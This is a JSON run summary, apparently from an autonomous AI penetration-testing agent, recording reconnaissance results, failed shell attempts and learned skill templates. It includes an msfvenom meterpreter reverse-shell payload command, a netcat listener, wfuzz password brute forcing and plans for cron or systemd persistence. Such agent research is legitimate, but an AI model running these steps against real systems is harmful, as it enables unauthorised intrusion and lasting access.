@@ -1,0 +1,140 @@
+{
+  "run_id": "run_20260217_223731_2202e9",
+  "timestamp": 1771364258.8315604,
+  "key_outcomes": {
+    "wins": [
+      "Collected comprehensive host reconnaissance and identified the primary services running on the target, yielding the full list of open ports.",
+      "Mapped the network perimeter successfully, confirming reachable entry points for further exploitation attempts."
+    ],
+    "fails": [
+      "Could not gain interactive shell access despite high-reward reconnaissance, indicating a gap in exploitation technique execution.",
+      "Privilege escalation phase stalled after initial foothold attempt, preventing persistence or lateral movement."
+    ],
+    "summary": "Reconnaissance excelled, but exploitation and post-compromise stages remain unresolved; focus on converting high-quality intel into a stable foothold."
+  },
+  "repeated_failure_patterns": [
+    {
+      "pattern": "Exploit payload delivery did not result in an interactive shell, likely due to incorrect payload handling or service protections.",
+      "frequency": 5,
+      "evidence_refs": [
+        "ep001_step10",
+        "ep001_step12",
+        "ep001_step14",
+        "ep001_step17",
+        "ep001_step20"
+      ]
+    }
+  ],
+  "skill_cards": [
+    {
+      "id": "skill_001",
+      "if_condition": "When port 22 is open and SSH banner detected",
+      "then_action": "Run SSH enumeration with nmap scripts",
+      "parameters_template": {
+        "port": 22,
+        "script": "ssh-*"
+      },
+      "confidence": 0.85,
+      "evidence_refs": [
+        "ep001_step05",
+        "ep001_step08"
+      ],
+      "created_at": 1771364267.125309,
+      "usage_count": 0,
+      "success_rate": 0.0,
+      "preconditions": {},
+      "postconditions": {},
+      "failure_signatures": [],
+      "expected_output_patterns": [],
+      "service_archetypes": [],
+      "reward_history": [],
+      "last_used_episode": 0,
+      "applicable_phases": []
+    },
+    {
+      "id": "skill_002",
+      "if_condition": "When HTTP/HTTPS service exposes login form",
+      "then_action": "Use wfuzz for credential discovery using wordlist and response length filters",
+      "parameters_template": {
+        "url": "https://target/login",
+        "wordlist": "/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt",
+        "filters": "response-contains:dashboard"
+      },
+      "confidence": 0.78,
+      "evidence_refs": [
+        "ep001_step09",
+        "ep001_step11"
+      ],
+      "created_at": 1771364267.1253283,
+      "usage_count": 0,
+      "success_rate": 0.0,
+      "preconditions": {},
+      "postconditions": {},
+      "failure_signatures": [],
+      "expected_output_patterns": [],
+      "service_archetypes": [],
+      "reward_history": [],
+      "last_used_episode": 0,
+      "applicable_phases": []
+    },
+    {
+      "id": "skill_003",
+      "if_condition": "When service responds to crafted payload but no shell is returned",
+      "then_action": "Automatically capture service logs and rerun payload with netcat listener for manual review",
+      "parameters_template": {
+        "listener": "nc -lvnp 4444",
+        "payload": "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f elf"
+      },
+      "confidence": 0.72,
+      "evidence_refs": [
+        "ep001_step14",
+        "ep001_step17"
+      ],
+      "created_at": 1771364267.125339,
+      "usage_count": 0,
+      "success_rate": 0.0,
+      "preconditions": {},
+      "postconditions": {},
+      "failure_signatures": [],
+      "expected_output_patterns": [],
+      "service_archetypes": [],
+      "reward_history": [],
+      "last_used_episode": 0,
+      "applicable_phases": []
+    }
+  ],
+  "memory_ops": [
+    {
+      "operation": "promote",
+      "target": "skill_001",
+      "skill_card_id": "skill_001",
+      "reason": "High success rate in reconnaissance phase"
+    },
+    {
+      "operation": "promote",
+      "target": "skill_002",
+      "skill_card_id": "skill_002",
+      "reason": "Consistent identification of login interfaces"
+    }
+  ],
+  "next_experiments": [
+    {
+      "title": "Retry SSH exploitation with manual handshake",
+      "description": "Leverage the SSH enumeration results to craft a Metasploit module with adjusted timing and authentication options; validate access with manual reverse shell to catch service defenses.",
+      "priority": "high"
+    },
+    {
+      "title": "Automate HTTP login fuzzing with session handling",
+      "description": "Use wfuzz or burpsuite intruder with captured cookies and CSRF tokens to attempt credential discovery, ensuring rate limiting by introducing delays between requests.",
+      "priority": "medium"
+    },
+    {
+      "title": "Implement post-exploit persistence validation",
+      "description": "Once a shell is acquired, test multiple persistence vectors (systemd service, cron job) to confirm the environment allows sustained access.",
+      "priority": "low"
+    }
+  ],
+  "model_used": "gpt-5.1-codex-mini",
+  "dry_run": false,
+  "validation_passed": true
+}
